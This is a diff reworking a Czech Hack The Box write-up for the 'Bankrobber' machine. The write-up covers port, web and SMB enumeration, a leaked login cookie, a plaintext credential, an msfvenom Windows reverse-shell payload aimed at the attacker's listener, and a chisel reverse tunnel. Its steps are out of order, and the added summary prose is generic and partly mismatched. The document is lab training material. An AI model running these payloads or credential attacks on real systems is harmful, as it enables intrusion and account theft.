@@ -5,11 +5,19 @@ title: "Bankrobber"
 date: 2020-11-02
 tags: windows linux rce smb ssh php
 ---
-[Bankrobber](https://www.hackthebox.eu/home/machines/profile/209) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.
+
+## Úvod a kontext
+
+Bankrobber je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.
+
+## Počáteční průzkum
 
 ### Vyhledání otevřených portů
-Nejdřív mapuji služby, které jsou dostupné zvenku.
-`nmap -p 1-65535 -T4 -A -sC -v $IP`
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+nmap -p 1-65535 -T4 -A -sC -v $IP
+```
 ```
 PORT    STATE SERVICE      VERSION
 80/tcp  open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
@@ -53,8 +61,11 @@ Host script results:
 ```
 
 ### Enumerace webu
-Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní stránky.
-`dirb http://$IP`
+
+Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
+```bash
+dirb http://$IP
+```
 ```
 ==> DIRECTORY: http://10.10.10.154/admin/
 + http://10.10.10.154/cgi-bin/ (CODE:403|SIZE:1058)
@@ -86,8 +97,11 @@ Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní strá
 ```
 
 ### Enumerace webu (2)
-Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní stránky.
-`dirb http://$IP -X .php`
+
+Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
+```bash
+dirb http://$IP -X .php
+```
 ```
 http://10.10.10.154/index.php
 http://10.10.10.154/link.php
@@ -99,23 +113,38 @@ http://10.10.10.154/user/transfer.php
 => document.cookie="id=3; username=dGhhY2tlcg%3D%3D; password=__CENSORED__
 ```
 
+## Získání přístupu
+
 ### Získání user flagu
-Tímto potvrzuji úspěšný uživatelský přístup.
-`more user.txt`
+
+User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
+```bash
+more user.txt
+```
 ```
 __CENSORED__
 ```
+
+## Eskalace oprávnění
 
 ### Získání root flagu
-Tímto potvrzuji úplné ovládnutí stroje.
-`more root.txt`
+
+Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+```bash
+more root.txt
+```
 ```
 __CENSORED__
 ```
 
+## Získání přístupu
+
 ### Spuštění exploitu
-Zde dochází k praktickému zneužití zranitelnosti.
-`msfvenom --platform Windows --payload windows/x64/shell/reverse_tcp -f psh -e x86/unicode_mixed -b "\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" BufferRegister=EAX LHOST=10.10.14.223 LPORT=4002`
+
+V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
+```text
+msfvenom --platform Windows --payload windows/x64/shell/reverse_tcp -f psh -e x86/unicode_mixed -b "\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" BufferRegister=EAX LHOST=10.10.14.223 LPORT=4002
+```
 ```
 wine64 /usr/share/windows-resources/ollydbg/OLLYDBG.EXE
 
@@ -129,17 +158,30 @@ chisel_windows_amd64.exe client 10.10.14.223:8008 R:910:0.0.0.0:910
 chisel server -p 8008 --reverse
 ```
 
+## Počáteční průzkum
+
 ### Vyhledání otevřených portů (2)
-Nejdřív mapuji služby, které jsou dostupné zvenku.
-`nmap $IP -p 139,445 -v --script=smb-enum* --script-args=smbuser=root,smbpass=pass,smbdomain=workgroup`
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+nmap $IP -p 139,445 -v --script=smb-enum* --script-args=smbuser=root,smbpass=pass,smbdomain=workgroup
+```
 
 ### Enumerace SMB
-Kontroluji SMB sdílení a hledám data, která mohou obsahovat citlivé informace.
-`smbclient -L $IP -N`
+
+U SMB sdílení ověřuji, jaká data jsou dostupná bez dalších oprávnění a zda z nich lze získat účty, dokumenty nebo konfigurační tajemství.
+```bash
+smbclient -L $IP -N
+```
+
+## Získání přístupu
 
 ### Spuštění exploitu (2)
-Zde dochází k praktickému zneužití zranitelnosti.
-`impacket-samrdump -csv $IP`
+
+V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
+```bash
+impacket-samrdump -csv $IP
+```
 ```
 ./impacket/examples/lookupsid.py cortin:"P4rkeerpl44ts\0"@$IP
 ./impacket/examples/getArch.py -target $IP
@@ -160,3 +202,16 @@ Zde dochází k praktickému zneužití zranitelnosti.
 ./windapsearch/windapsearch.py --dc-ip $IP --full --functionality -G -U -PU -C --da --admin-objects --user-spns --unconstrained-users --unconstrained-computers --gpos  > windapsearch.txt
 ./windapsearch/windapsearch.py --dc-ip $IP -u user -p pass --full --functionality -G -U -PU -C --da --admin-objects --user-spns --unconstrained-users --unconstrained-computers --gpos  > windapsearch.txt
 ```
+
+## Shrnutí klíčových poznatků
+
+- Rozhodující byla síťová a doménová enumerace, protože právě z dostupných služeb a sdílení vzešly další identity nebo tajné údaje.
+- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
+- Finální část ukazuje, že po získání shellu je nutné systematicky hledat slabé delegace oprávnění, uložená tajemství a automatizované procesy.
+
+## Co si odnést do praxe
+
+- Ve webové vrstvě je důležité omezit úniky citlivých souborů, testovacích endpointů a vývojových artefaktů, protože často slouží jako odrazový můstek k dalším službám.
+- V prostředí Active Directory je klíčové hlídat oprávnění ke sdílením, servisním účtům a delegacím; i malý únik informací se snadno řetězí do dalších kroků.
+- Přístupové údaje je potřeba oddělovat mezi službami a minimalizovat jejich opětovné použití, jinak se z jedné slabiny rychle stane plnohodnotný vstup do systému.
+- Inventura verzí a včasné záplatování snižují prostor pro přímé zneužití známých chyb i pro slepé spoléhání na zastaralé komponenty.
